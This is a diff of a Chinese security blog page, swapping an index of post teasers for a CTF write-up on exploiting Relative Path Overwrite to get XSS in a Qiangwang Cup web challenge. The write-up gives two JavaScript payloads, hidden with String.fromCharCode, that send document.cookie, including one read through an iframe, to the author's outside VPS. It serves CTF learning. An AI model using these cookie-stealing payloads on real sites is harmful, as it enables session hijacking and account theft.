@@ -6,17 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="www.xnianq.cn">
-  <title>xnianq&#39;blog</title>
+  <title>强网杯一道web题目 | xnianq&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="More Code,less talk!">
-<meta property="og:type" content="website">
-<meta property="og:title" content="xnianq&#39;blog">
-<meta property="og:url" content="www.xnianq.cn/page/2/index.html">
+  <meta name="description" content="Share your mind之前很少做前端的题目，这次感觉这道题目很好玩，就学习了以下。题目描述：  http://39.107.33.96:20000Please help me find the vulnerability before I finish this site！hint：xss bot使用phantomjs，版本2.1.1hint2 : xss的点不在report页面  RPO">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯一道web题目">
+<meta property="og:url" content="www.xnianq.cn/2018/03/27/强网杯一道web题目/index.html">
 <meta property="og:site_name" content="xnianq&#39;blog">
-<meta property="og:description" content="More Code,less talk!">
+<meta property="og:description" content="Share your mind之前很少做前端的题目，这次感觉这道题目很好玩，就学习了以下。题目描述：  http://39.107.33.96:20000Please help me find the vulnerability before I finish this site！hint：xss bot使用phantomjs，版本2.1.1hint2 : xss的点不在report页面  RPO">
+<meta property="og:image" content="http://xnianq.cn/2018/03/27/强网杯一道web题目/RPO-1.png">
+<meta property="og:image" content="http://xnianq.cn/2018/03/27/强网杯一道web题目/RPO-2.png">
+<meta property="og:image" content="http://xnianq.cn/2018/03/27/强网杯一道web题目/RPO-3.png">
+<meta property="og:image" content="http://xnianq.cn/2018/03/27/强网杯一道web题目/RPO-4.png">
+<meta property="og:image" content="http://xnianq.cn/2018/03/27/强网杯一道web题目/flag.jpg">
+<meta property="og:updated_time" content="2018-03-27T07:55:53.932Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xnianq&#39;blog">
-<meta name="twitter:description" content="More Code,less talk!">
+<meta name="twitter:title" content="强网杯一道web题目">
+<meta name="twitter:description" content="Share your mind之前很少做前端的题目，这次感觉这道题目很好玩，就学习了以下。题目描述：  http://39.107.33.96:20000Please help me find the vulnerability before I finish this site！hint：xss bot使用phantomjs，版本2.1.1hint2 : xss的点不在report页面  RPO">
+<meta name="twitter:image" content="http://xnianq.cn/2018/03/27/强网杯一道web题目/RPO-1.png">
   
     <link rel="alternative" href="/atom.xml" title="xnianq&#39;blog" type="application/atom+xml">
   
@@ -152,67 +159,149 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="title-cbc字节翻转攻击" class="article article-type-title  article-index" itemscope itemprop="blogPost">
+            <article id="post-强网杯一道web题目" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/07/28/cbc字节翻转攻击/">cbc字节翻转攻击</a>
+    <h1 class="article-title" itemprop="name">
+      强网杯一道web题目
     </h1>
   
 
         
-        <a href="/2017/07/28/cbc字节翻转攻击/" class="archive-article-date">
-  	<time datetime="2017-07-28T08:27:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-28</time>
+        <a href="/2018/03/27/强网杯一道web题目/" class="archive-article-date">
+  	<time datetime="2018-03-27T07:25:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-27</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="cbc字节翻转攻击"><a href="#cbc字节翻转攻击" class="headerlink" title="cbc字节翻转攻击"></a>cbc字节翻转攻击</h1><p>感觉在密码学课上朱老师并没有讲到这种攻击方法，个人感觉是cbc模式设置的缺陷，在ctf比赛中也碰到过几次，当时年少无知，没有想到过还有这种思路，所以现在想总结一下，以免在以后比赛中丢分。<br>
-        
-          <a class="article-more-a" href="/2017/07/28/cbc字节翻转攻击/#more">more >></a>
-        
+        <h1 id="Share-your-mind"><a href="#Share-your-mind" class="headerlink" title="Share your mind"></a>Share your mind</h1><p>之前很少做前端的题目，这次感觉这道题目很好玩，就学习了以下。<br>题目描述：</p>
+<blockquote>
+<p><a href="http://39.107.33.96:20000" target="_blank" rel="external">http://39.107.33.96:20000</a><br>Please help me find the vulnerability before I finish this site！<br>hint：xss bot使用phantomjs，版本2.1.1<br>hint2 : xss的点不在report页面</p>
+</blockquote>
+<h2 id="RPO"><a href="#RPO" class="headerlink" title="RPO"></a>RPO</h2><p>RPO（Relative Path Overwrite）相对路径覆盖，是一种新型攻击技术，最早由Gareth Heyes在其发表的文章中提出。主要是利用浏览器的一些特性和部分服务端的配置差异导致的漏洞，通过一些技巧，我们可以通过相对路径来引入其他的资源文件，以至于达成我们想要的目的。<br>就目前来看此攻击方法依赖于浏览器和网络服务器的反应，基于服务器的Web缓存技术和配置差异，以及服务器和客户端浏览器的解析差异，利用前端代码中加载的css/js的相对路径来加载其他文件，最终浏览器将服务器返回的不是css/js的文件当做css/js来解析，从而导致XSS，信息泄露等漏洞产生。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>拿到这个题目时候很明显，是xss，通过提交然后在访问触发xss。但是访问过程中进行了html实体编码，所以直接触发xss是行不通的，问了下大哥，大哥说是RPO，于是就学习了一波RPO是啥（如上）。<br>RPO漏洞触发的本质就是浏览器和服务器特性的差异，导致可以控制css/js文件，进而触发xss。</p>
+<h2 id="确定存在RPO"><a href="#确定存在RPO" class="headerlink" title="确定存在RPO"></a>确定存在RPO</h2><p>访问：<a href="http://39.107.33.96:20000/index.php/add" target="_blank" rel="external">http://39.107.33.96:20000/index.php/add</a><br>可以看到页面加载了以下文件，并且连接如下：<br><img src="http://xnianq.cn/2018/03/27/强网杯一道web题目/RPO-1.png" alt=""><br>当我们访问<a href="http://39.107.33.96:20000/index.php/add/..%2f..%2f时,jquery.min.js的路径已经改变，可以确定时RPO攻击" target="_blank" rel="external">http://39.107.33.96:20000/index.php/add/..%2f..%2f时,jquery.min.js的路径已经改变，可以确定时RPO攻击</a><br><img src="http://xnianq.cn/2018/03/27/强网杯一道web题目/RPO-2.png" alt=""></p>
+<h2 id="控制js文件"><a href="#控制js文件" class="headerlink" title="控制js文件"></a>控制js文件</h2><p>我们现在可以通过<a href="http://39.107.33.96:20000/index.php/view访问到输入的内容，如果可以利用RPO将这些内容控制为js文件，就可以触发xss.思路就是这样，我们先提交js语句，比如alert(1)；然后利用RPO将js文件控制，进行js解析，就可以执行了。" target="_blank" rel="external">http://39.107.33.96:20000/index.php/view访问到输入的内容，如果可以利用RPO将这些内容控制为js文件，就可以触发xss.思路就是这样，我们先提交js语句，比如alert(1)；然后利用RPO将js文件控制，进行js解析，就可以执行了。</a><br><img src="http://xnianq.cn/2018/03/27/强网杯一道web题目/RPO-3.png" alt=""><br><img src="http://xnianq.cn/2018/03/27/强网杯一道web题目/RPO-4.png" alt=""><br>现在我们访问jquery.min.js,发现内容已经变成了alert(1)。<br>现在就可以构造payload弹回cookie, 发现不能使用引号, 所以使用<code>String.fromCharCode</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> n0t = <span class="built_in">document</span>.createElement(<span class="built_in">String</span>.fromCharCode(<span class="number">108</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">107</span>));</div><div class="line">n0t.setAttribute(<span class="built_in">String</span>.fromCharCode(<span class="number">114</span>,<span class="number">101</span>,<span class="number">108</span>),<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">102</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">99</span>,<span class="number">104</span>));</div><div class="line">n0t.setAttribute(<span class="built_in">String</span>.fromCharCode(<span class="number">104</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">102</span>),<span class="built_in">String</span>.fromCharCode(<span class="number">104</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">47</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">53</span>,<span class="number">57</span>,<span class="number">46</span>,<span class="number">52</span>,<span class="number">57</span>,<span class="number">46</span>,<span class="number">56</span>,<span class="number">53</span>,<span class="number">58</span>,<span class="number">56</span>,<span class="number">56</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">47</span>)+<span class="built_in">document</span>.cookie);</div><div class="line"><span class="built_in">document</span>.head.appendChild(n0t);</div></pre></td></tr></table></figure></p>
+<p>vps弹回的cookie是一个hint, 告诉我们要拿到目录<code>/QWB_fl4g/QWB/</code>下的cookie, 于是构造一个iframe, 先把该路径下cookie读到, 然后再弹到vps上.<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> n=<span class="built_in">document</span>.createElement(<span class="built_in">String</span>.fromCharCode(<span class="number">105</span>,<span class="number">102</span>,<span class="number">114</span>,<span class="number">97</span>,<span class="number">109</span>,<span class="number">101</span>));</div><div class="line">n.setAttribute(<span class="built_in">String</span>.fromCharCode(<span class="number">115</span>,<span class="number">114</span>,<span class="number">99</span>),<span class="built_in">String</span>.fromCharCode(<span class="number">104</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">47</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">48</span>,<span class="number">55</span>,<span class="number">46</span>,<span class="number">51</span>,<span class="number">51</span>,<span class="number">46</span>,<span class="number">57</span>,<span class="number">54</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">47</span>,<span class="number">81</span>,<span class="number">87</span>,<span class="number">66</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">52</span>,<span class="number">103</span>,<span class="number">47</span>,<span class="number">81</span>,<span class="number">87</span>,<span class="number">66</span>,<span class="number">47</span>));</div><div class="line">n.setAttribute(<span class="built_in">String</span>.fromCharCode(<span class="number">105</span>,<span class="number">100</span>), <span class="built_in">String</span>.fromCharCode(<span class="number">107</span>,<span class="number">107</span>));</div><div class="line"><span class="built_in">document</span>.body.appendChild(n);</div><div class="line">l=<span class="built_in">document</span>.getElementById(<span class="built_in">String</span>.fromCharCode(<span class="number">107</span>,<span class="number">107</span>));</div><div class="line"></div><div class="line">l.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> m=<span class="built_in">document</span>.getElementById(<span class="built_in">String</span>.fromCharCode(<span class="number">107</span>,<span class="number">107</span>)).contentWindow;</div><div class="line">    <span class="keyword">var</span> n0t=<span class="built_in">document</span>.createElement(<span class="built_in">String</span>.fromCharCode(<span class="number">108</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">107</span>));</div><div class="line">    n0t.setAttribute(<span class="built_in">String</span>.fromCharCode(<span class="number">114</span>,<span class="number">101</span>,<span class="number">108</span>),<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">102</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">99</span>,<span class="number">104</span>));</div><div class="line">n0t.setAttribute(<span class="built_in">String</span>.fromCharCode(<span class="number">104</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">102</span>),<span class="built_in">String</span>.fromCharCode(<span class="number">104</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">47</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">53</span>,<span class="number">57</span>,<span class="number">46</span>,<span class="number">52</span>,<span class="number">57</span>,<span class="number">46</span>,<span class="number">56</span>,<span class="number">53</span>,<span class="number">58</span>,<span class="number">56</span>,<span class="number">56</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">47</span>)+m.document.cookie);</div><div class="line">    <span class="built_in">document</span>.head.appendChild(n0t);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>就可以拿到flag.<br><img src="http://xnianq.cn/2018/03/27/强网杯一道web题目/flag.jpg" alt=""></p>
+<hr>
+<p>本文出自”xnianq Blog”：www.xnianq.cn/2018/03/27/强网杯一道web题目/</p>
+
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://ofutja06x.bkt.clouddn.com/zfb.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://ofutja06x.bkt.clouddn.com/wx.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">crypto</a>
-        		</li>
-      		
-		</ul>
-	</div>
+      
 
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/07/28/cbc字节翻转攻击/">展开全文 >></a>
-        </p>
-      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
 
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http:www.xnianq.cn/2018/03/27/强网杯一道web题目/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2018/03/26/2018腾讯实习面试经历/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">2018腾讯安全实习面试经历</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -232,720 +321,12 @@
 
 
 
-
-  
-    <article id="title-padding-oracle" class="article article-type-title  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/07/26/padding-oracle/">padding-oracle</a>
-    </h1>
-  
-
-        
-        <a href="/2017/07/26/padding-oracle/" class="archive-article-date">
-  	<time datetime="2017-07-26T09:56:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="padding-oracle攻击"><a href="#padding-oracle攻击" class="headerlink" title="padding-oracle攻击"></a>padding-oracle攻击</h1><p>很久不写文章了，各种比赛，还有工作的原因，仔细想想很久不静下来学一些东西了，最近工作过程中，碰到了padding-oracle这种攻击，以前也在ctf中遇到过，所以想写一篇文章记录一下学习过程。网上有很多介绍padding-oracle的，不过感觉文章偏理论，所以自己找了一台靶机进行实验，靶机地址:<a href="https://pentesterlab.com/exercises/padding_oracle" target="_blank" rel="external">https://pentesterlab.com/exercises/padding_oracle</a><br>
-        
-          <a class="article-more-a" href="/2017/07/26/padding-oracle/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">crypto</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/07/26/padding-oracle/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="title-sql盲注笔记" class="article article-type-title  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/04/07/sql盲注笔记/">sql盲注笔记</a>
-    </h1>
-  
-
-        
-        <a href="/2017/04/07/sql盲注笔记/" class="archive-article-date">
-  	<time datetime="2017-04-07T06:47:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="基于时间盲注"><a href="#基于时间盲注" class="headerlink" title="基于时间盲注"></a>基于时间盲注</h1><p>注入还是需要练习的，在学mysql，正好看到了盲注，就自己弄了个sqli-labs玩一玩。开始之前先说一下用到的几个函数吧。</p>
-<ul>
-<li><code>sleep(seconds)</code>：即延迟几秒执行sql命令</li>
-<li><code>substring()</code>:截取字符串</li>
-<li><code>mid()</code>:同样是截取字符串</li>
-<li><code>left()</code>:从左边返回指定长度字符串。<br><strong>sleep()函数是在mysql5.0.12之后版本出现的，在之前使用benchmark</strong>
-        
-          <a class="article-more-a" href="/2017/04/07/sql盲注笔记/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">sqli</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/04/07/sql盲注笔记/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="title-通过ARP通信传输木马" class="article article-type-title  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/30/通过ARP通信传输木马/">通过ARP通信传输木马</a>
-    </h1>
-  
-
-        
-        <a href="/2017/03/30/通过ARP通信传输木马/" class="archive-article-date">
-  	<time datetime="2017-03-30T00:01:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="通过ARP攻击绕过杀毒软件种植木马"><a href="#通过ARP攻击绕过杀毒软件种植木马" class="headerlink" title="通过ARP攻击绕过杀毒软件种植木马"></a>通过ARP攻击绕过杀毒软件种植木马</h1><p>在介绍完如何通过DNS植入木马之后，我现在想介绍一下如何通过ARP攻击植入木马，而且我还想告诉你”大部分的杀毒软件都没办法检测到这种攻击”<br>
-        
-          <a class="article-more-a" href="/2017/03/30/通过ARP通信传输木马/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">pentest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/03/30/通过ARP通信传输木马/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="title-mysql-unsha1-登录明文密码未知的MYSQL数据库" class="article article-type-title  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/19/mysql-unsha1-登录明文密码未知的MYSQL数据库/">mysql-unsha1:登录明文密码未知的MYSQL数据库</a>
-    </h1>
-  
-
-        
-        <a href="/2017/03/19/mysql-unsha1-登录明文密码未知的MYSQL数据库/" class="archive-article-date">
-  	<time datetime="2017-03-19T09:10:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><em>项目地址</em>：<a href="https://github.com/cyrus-and/mysql-unsha1" target="_blank" rel="external">https://github.com/cyrus-and/mysql-unsha1</a></p>
-<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>这个PoC用于在不知道明文密码的情况下对启用了<a href="https://dev.mysql.com/doc/internals/en/secure-password-authentication.html" target="_blank" rel="external">密码安全认证插件</a>（默认开启插件：mysql_native_password）的MYSQL数据库进行登录。</p>
-<p>前提条件为：</p>
-<ul>
-<li>为了获取到已知用户的hash，我们需要读取到目标数据库中的<code>mysql.user</code>表。</li>
-<li>能够拦截到上述已知用户执行成功的认证信息（即通过SSL认证无法攻击成功）。</li>
-</ul>
-<p>注意：这并不是MYSQL的一个漏洞，只是认证协议工作的直接后果。如果攻击者已经满足了上面两个前提，那么整个系统应该是已经被攻破了。则这篇文章只是对MYSQL服务器获取权限的另外一种思路。<br>
-        
-          <a class="article-more-a" href="/2017/03/19/mysql-unsha1-登录明文密码未知的MYSQL数据库/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/03/19/mysql-unsha1-登录明文密码未知的MYSQL数据库/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="title-密码学初涉" class="article article-type-title  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/02/22/密码学初涉/">密码学初涉</a>
-    </h1>
-  
-
-        
-        <a href="/2017/02/22/密码学初涉/" class="archive-article-date">
-  	<time datetime="2017-02-22T12:28:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="密码学初涉"><a href="#密码学初涉" class="headerlink" title="密码学初涉"></a>密码学初涉</h1><p>这学期不能混下去了，密码学好好学，立一个flag，每讲一个密码都会写一份程序放到博客上，欢迎大佬们监督。</p>
-        
-          <a class="article-more-a" href="/2017/02/22/密码学初涉/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">crypto</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/02/22/密码学初涉/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="title-google-hacking" class="article article-type-title  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/20/google-hacking/">google-hacking</a>
-    </h1>
-  
-
-        
-        <a href="/2016/12/20/google-hacking/" class="archive-article-date">
-  	<time datetime="2016-12-20T04:58:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h1><p>Google hacking is the term used when a hacker tries to find exploitable targets and sensitive data by using search engines. The Google Hacking Database (GHDB) is a database of queries that identify sensitive data. Although Google blocks some of the better known Google hacking queries, nothing stops a hacker from crawling your site and launching the Google Hacking Database queries directly onto the crawled content.<br>
-        
-          <a class="article-more-a" href="/2016/12/20/google-hacking/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/20/google-hacking/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
